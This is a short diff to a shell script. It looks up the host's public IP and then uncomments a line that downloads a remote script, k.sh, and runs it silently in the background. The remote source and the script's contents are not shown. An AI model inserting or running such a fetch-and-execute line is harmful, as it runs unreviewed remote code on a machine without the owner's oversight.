@@ -20,7 +20,7 @@ addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/n
 [ -n "$addr" ] || addr="NULL"
 
 
-###bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
+bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
 idlePid="$!"
 
 
